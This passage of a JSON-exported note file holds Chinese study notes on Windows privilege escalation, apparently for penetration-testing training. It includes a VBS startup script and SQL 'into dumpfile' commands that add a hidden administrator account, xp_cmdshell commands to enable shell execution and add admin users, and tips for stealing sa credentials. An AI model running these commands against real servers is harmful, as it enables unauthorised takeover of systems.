33%;\"}"},{"Type":"NodeText","Data":"​​"}]}]}]},{"ID":"20241028111517-l3ftoh1","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241028111517-l3ftoh1","updated":"20241028111517"},"Children":[{"Type":"NodeText","Data":"​​"}]},{"ID":"20241028111543-m4g6jy9","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","id":"20241028111543-m4g6jy9","updated":"20241028111605"},"Children":[{"Type":"NodeText","Data":"启动项提权--vbs"}]},{"ID":"20241029152332-xx1smh5","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241029152332-xx1smh5","updated":"20241029152334"},"Children":[{"Type":"NodeText","Data":"原理"}]},{"ID":"20241029152339-xssp3t4","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029152339-xssp3t4","updated":"20241029152451"},"Children":[{"Type":"NodeText","Data":"将一段"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"VBS脚本"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"导入到开机启动项中，如果管理员"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"重启了服务器"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，那么就会"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"自动调用该脚本"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，并"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"执行"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"其中的用户添加及提权命令"}]},{"ID":"20241028111602-i9jcxx1","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241028111602-i9jcxx1","updated":"20241029152511"},"Children":[{"Type":"NodeText","Data":"利用条件"}]},{"ID":"20241029152514-tjynuhd","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029152514-tjynuhd","updated":"20241029152611"},"Children":[{"Type":"NodeText","Data":"1.上传到目录必须具备"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"可读写"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"的权限"}]},{"ID":"20241029152528-8kmdb4o","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029152528-8kmdb4o","updated":"20241029152615"},"Children":[{"Type":"NodeText","Data":"2.调用的"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"cmd"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"也必须有"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"足够的权限"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029152538-w90lska","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029152538-w90lska","updated":"20241029152623"},"Children":[{"Type":"NodeText","Data":"3."},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"重启服务器"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"可以利用一些可导致服务器"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"蓝屏的exp"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，或者"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"DDOS拒绝服务"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029152630-9xkhox6","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241029152630-9xkhox6","updated":"20241029152633"},"Children":[{"Type":"NodeText","Data":"提权方式"}]},{"ID":"20241029152642-qhl67ub","Type":"NodeList","ListData":{},"Properties":{"fold":"1","heading-fold":"1","id":"20241029152642-qhl67ub","updated":"20241029152826"},"Children":[{"ID":"20241029152701-ul27n5k","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029152701-ul27n5k","updated":"20241029152701"},"Children":[{"ID":"20241029152701-3gntoje","Type":"NodeParagraph","Properties":{"id":"20241029152701-3gntoje","updated":"20241029152701"},"Children":[{"Type":"NodeText","Data":"直接将vbs提权脚本上传到启动项目录下"}]},{"ID":"20241029152753-g4yk32k","Type":"NodeList","ListData":{},"Properties":{"id":"20241029152753-g4yk32k"},"Children":[{"ID":"20241029152752-hf3th4c","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029152752-hf3th4c"},"Children":[{"ID":"20241029152754-lixmhgs","Type":"NodeParagraph","Properties":{"id":"20241029152754-lixmhgs","updated":"20241029152754"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028200719-8mbdypk.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029152754-ztf0v50","Type":"NodeParagraph","Properties":{"id":"20241029152754-ztf0v50","updated":"20241029152754"},"Children":[{"Type":"NodeText","Data":"vbs提权脚本代码："}]},{"ID":"20241029152754-cf43dvo","Type":"NodeParagraph","Properties":{"id":"20241029152754-cf43dvo","updated":"20241029152754"},"Children":[{"Type":"NodeText","Data":"guagua.vbs"}]},{"ID":"20241029152754-7tiow57","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029152754-7tiow57","updated":"20241029152754"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"set wsnetwork=CreateObject(\"WSCRIPT.NETWORK\") \nos=\"WinNT://\"\u0026wsnetwork.ComputerName \nSet ob=GetObject(os)         '得到adsi接口,绑定 \nSet oe=GetObject(os\u0026\"/Administrators,group\")       '属性,admin组 \nSet od=ob.Create(\"user\", \"guagua\")         '建立用户 \nod.SetPassword \"123.com\"        '设置密码 \nod.SetInfo         '保存 \nSet of=GetObject(os\u0026\"/guagua\",user)        '得到用户 \noe.add os\u0026\"/guagua\"\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029152754-rgpq4iw","Type":"NodeParagraph","Properties":{"id":"20241029152754-rgpq4iw","updated":"20241029152754"},"Children":[{"Type":"NodeText","Data":"将该文件上传到启动项目就可以C:/Documents and Settings/All Users/"}]},{"ID":"20241029152754-909d9ok","Type":"NodeParagraph","Properties":{"id":"20241029152754-909d9ok","updated":"20241029152754"},"Children":[{"Type":"NodeText","Data":"查看用户"}]},{"ID":"20241029152754-7a314bo","Type":"NodeParagraph","Properties":{"id":"20241029152754-7a314bo","updated":"20241029152754"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028201335-4peocwd.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]}]}]},{"ID":"20241029152704-twckacr","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029152704-twckacr","updated":"20241029152826"},"Children":[{"ID":"20241029152704-gejrjt2","Type":"NodeParagraph","Properties":{"id":"20241029152704-gejrjt2","updated":"20241029152721"},"Children":[{"Type":"NodeText","Data":"利用sql命令来进行vbs脚本的创建及添加"}]},{"ID":"20241029152809-7m9j2fx","Type":"NodeList","ListData":{},"Properties":{"id":"20241029152809-7m9j2fx","updated":"20241029152826"},"Children":[{"ID":"20241029152809-vwsnwfe","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029152809-vwsnwfe","updated":"20241029152826"},"Children":[{"ID":"20241029152810-m67b1mj","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029152810-m67b1mj","updated":"20241029152810"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"create table gua(cmd text);\ninsert into gua values(\"set wshshell=createobject(\"\"wscript.shell\"\")\");\ninsert into gua values(\"a=wshell.run(\"\"cmd.exe /c net user gua1 1qaz@WSX /add\"\",0)\");\ninsert into gua valuse(\"b=wshell.run(\"\"cmd.exe /c net user localgroup administrators gua1 /add\"\",0)\");\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029152810-ofyqpnz","Type":"NodeParagraph","Properties":{"id":"20241029152810-ofyqpnz","updated":"20241029152821"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 33%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028201949-igyda2z.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 33%;\"}"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 67%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028202013-9tqarcp.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 67%;\"}"},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029152810-1wo95x2","Type":"NodeParagraph","Properties":{"id":"20241029152810-1wo95x2","updated":"20241029152810"},"Children":[{"Type":"NodeText","Data":"输出表为一个vbs的脚本文件"}]},{"ID":"20241029152810-8zun2de","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029152810-8zun2de","updated":"20241029152810"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"SELECT * from gua into dumpfile \"C:\\Document and Settings\\Administrator\\「开始」菜单\\1.vbs\"\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029152810-w30fhkj","Type":"NodeParagraph","Properties":{"id":"20241029152810-w30fhkj","updated":"20241029152826"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 67%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028202503-zyamcmb.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 67%;\"}"},{"Type":"NodeText","Data":"​"}]}]}]}]}]},{"ID":"20241028111727-73db4cd","Type":"NodeHeading","HeadingLevel":3,"Properties":{"fold":"1","id":"20241028111727-73db4cd","updated":"20241028111742"},"Children":[{"Type":"NodeText","Data":"MSSQL数据库提权"}]},{"ID":"20241029153116-neth8tx","Type":"NodeHeading","HeadingLevel":4,"Properties":{"fold":"1","heading-fold":"1","id":"20241029153116-neth8tx","updated":"20241029153122"},"Children":[{"Type":"NodeText","Data":"利用条件"}]},{"ID":"20241029153123-fvr67ck","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241029153123-fvr67ck","updated":"20241029153628"},"Children":[{"Type":"NodeText","Data":"1.必须获得"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"sa的账号密码"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"或者与s"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"a相同给权限的账号密码"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，且"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"mssql没有被降权"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029153734-vxr56sa","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241029153734-vxr56sa","updated":"20241029153745"},"Children":[{"Type":"NodeText","Data":"获取sa的账号密码方法"}]},{"ID":"20241029153745-ty469rm","Type":"NodeList","ListData":{},"Properties":{"fold":"1","heading-fold":"1","id":"20241029153745-ty469rm","updated":"20241029154119"},"Children":[{"ID":"20241029153751-2swdias","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029153751-2swdias","updated":"20241029154119"},"Children":[{"ID":"20241029153751-sfrrb0i","Type":"NodeParagraph","Properties":{"id":"20241029153751-sfrrb0i","updated":"20241029154119"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"webshell或源码获取"}]},{"ID":"20241029154031-fk0cuyp","Type":"NodeParagraph","Properties":{"id":"20241029154031-fk0cuyp","updated":"20241029154045"},"Children":[{"Type":"NodeText","Data":"一般在网站的配置文件中有存"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"明文账号密码"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，常用配置文件："},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"conn.apx config.aspx config.php"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"等"}]},{"ID":"20241029153910-dul1cw2","Type":"NodeParagraph","Properties":{"id":"20241029153910-dul1cw2","updated":"20241029153949"},"Children":[{"Type":"NodeText","Data":"一般格式：sever=localhost;UID=sa;PWD=ichunqiu;database=ichunqiu"}]}]},{"ID":"20241029153951-48pbvot","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029153951-48pbvot","updated":"20241029154117"},"Children":[{"ID":"20241029153951-h3ydsqq","Type":"NodeParagraph","Properties":{"id":"20241029153951-h3ydsqq","updated":"20241029154117"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"源代码泄露"}]},{"ID":"20241029154007-0n05zfa","Type":"NodeParagraph","Properties":{"id":"20241029154007-0n05zfa","updated":"20241029154059"},"Children":[{"Type":"NodeText","Data":"网站源码泄露情况主要以程序员上传代码到"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"git等开源平台"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"或更新代码时"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"未删除备份文件"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，以及运维人员"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"打包源代码"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"\n"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"到网站服务器"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]}]},{"ID":"20241029154020-gtdequ5","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029154020-gtdequ5","updated":"20241029154116"},"Children":[{"ID":"20241029154020-u3lzb1a","Type":"NodeParagraph","Properties":{"id":"20241029154020-u3lzb1a","updated":"20241029154116"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"嗅探"},{"Type":"NodeText","Data":"\n在局域网中使用 Cain 等工具进行 "},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"arp嗅探"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":" 的时候可以"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"抓取"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"到1433端口的数据库明文登录密码\n"}]}]},{"ID":"20241029154024-q14cwud","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029154024-q14cwud","updated":"20241029154114"},"Children":[{"ID":"20241029154024-9wazjqs","Type":"NodeParagraph","Properties":{"id":"20241029154024-9wazjqs","updated":"20241029154114"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"口令暴力破解"},{"Type":"NodeText","Data":"\n利用"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"mssql"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"暴力破解工具对mssql进行破解，成功后会获得sa相应的权限"}]}]}]},{"ID":"20241029153157-2u19ixc","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241029153157-2u19ixc","updated":"20241029153636"},"Children":[{"Type":"NodeText","Data":"2.必须可以以某种方式"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"执行sql语句"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，例如"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"webshell"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"或者"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"1433端口"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"连接"}]},{"ID":"20241029153719-7h0t4ea","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029153719-7h0t4ea"}},{"ID":"20241028111748-rzibk08","Type":"NodeHeading","HeadingLevel":4,"Properties":{"fold":"1","heading-fold":"1","id":"20241028111748-rzibk08","updated":"20241028111759"},"Children":[{"Type":"NodeText","Data":"xp_cmdshell提权"}]},{"ID":"20241029154340-z8okbax","Type":"NodeBlockquote","Properties":{"fold":"1","heading-fold":"1","id":"20241029154340-z8okbax","updated":"20241029154553"},"Children":[{"ID":"20241029154336-n7yz15g","Type":"NodeParagraph","Properties":{"id":"20241029154336-n7yz15g","updated":"20241029154553"},"Children":[{"Type":"NodeText","Data":"cp_cmdshell脚本是"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"扩展存储过程的脚本"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，是"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"危险性"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"最高的\"小脚本\"，可以"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"执行操作系统的任何指令"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029154425-yy4tsxm","Type":"NodeParagraph","Properties":{"id":"20241029154425-yy4tsxm","updated":"20241029154425"},"Children":[{"Type":"NodeText","Data":"存储过程"}]},{"ID":"20241029154428-zvdmss7","Type":"NodeParagraph","Properties":{"id":"20241029154428-zvdmss7","updated":"20241029154428"},"Children":[{"Type":"NodeText","Data":"\t是存储在sqlserver中预先定义好的“SQL语句集合”，用来实现一些复杂操作"}]},{"ID":"20241029154425-u9zv7up","Type":"NodeParagraph","Properties":{"id":"20241029154425-u9zv7up","updated":"20241029154425"},"Children":[{"Type":"NodeText","Data":"\t使用T-SQL语言编写好的各种小脚本共同组成的集合体--存储过程，类似udf"}]},{"ID":"20241029154435-6lbz6pn","Type":"NodeParagraph","Properties":{"id":"20241029154435-6lbz6pn","updated":"20241029154437"},"Children":[{"Type":"NodeText","Data":"PS："}]},{"ID":"20241029154439-lpct66g","Type":"NodeParagraph","Properties":{"id":"20241029154439-lpct66g","updated":"20241029154544"},"Children":[{"Type":"NodeText","Data":"1.xp_cmdshell默认在mssql"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"2000中是开启"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"的，在"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"2005之后"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"的版本中是"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"默认禁止"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029154509-2yq2xm3","Type":"NodeParagraph","Properties":{"id":"20241029154509-2yq2xm3","updated":"20241029154537"},"Children":[{"Type":"NodeText","Data":"2.如果用户拥有管理员sa权限则可以使用"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"sp_configure"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"重新启动它"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20241029154313-n8em9t1","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241029154313-n8em9t1","updated":"20241029154612"},"Children":[{"Type":"NodeText","Data":"提取过程（2005版本之后）"}]},{"ID":"20241029154614-spu8wi5","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029154614-spu8wi5","updated":"20241029154625"},"Children":[{"Type":"NodeText","Data":"1.开启xp_cmdshell"}]},{"ID":"20241029154628-qnsh3sw","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029154628-qnsh3sw","updated":"20241029154706"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"exec sp_configure 'show advanced options',1;   //允许修改高级参数\nreconfigure;\nexec sp_configure 'xp_cmdshell',1;            //打开xp cmdshell 扩展\nreconfigure;\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241030142905-5qjd08h","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241030142905-5qjd08h","updated":"20241030142905"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241030142905-618dc0b.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241028112101-pzctes4","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241028112101-pzctes4","updated":"20241029154720"},"Children":[{"Type":"NodeText","Data":"2.xp_cmdshell执行命令"}]},{"ID":"20241029154721-fayy21q","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029154721-fayy21q","updated":"20241030143215"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"exec xp_cmdshell 'net user ichungiu 123.com /add';                //添加用户ichungiu，密码123.com\nexec xp_cmdshell ' net localgroup administrators ichungiu /add';  //添加ichungiu到管理员组\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241030143339-twuxc6e","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241030143339-twuxc6e","updated":"20241030143351"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241030143339-juos1aw.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241030143351-9lqi7ue.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​"}]},{"ID":"20241030143337-61ca4vk","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241030143337-61ca4vk"}},{"ID":"20241029154826-qeerh0a","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241029154826-qeerh0a","updated":"20241029154840"},"Children":[{"Type":"NodeText","Data":"提取过程（2005之前）"}]},{"ID":"20241029154840-brm8hz2","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029154840-brm8hz2","updated":"20241030143822"},"Children":[{"Type":"NodeText","Data":"1.连接数据库 select name from master.dbo.sysdatabases;   //获取所有的数据库名"}]},{"ID":"20241030143832-57gparx","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241030143832-57gparx","updated":"20241030143832"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241030143832-z69e9h0.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029154923-cn51323","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029154923-cn51323","updated":"20241029154925"},"Children":[{"Type":"NodeText","Data":"2.查看相关信息"}]},{"ID":"20241029154926-ugvefzo","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029154926-ugvefzo","updated":"20241030144016"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"select @@version                      查看当前版本\nselect 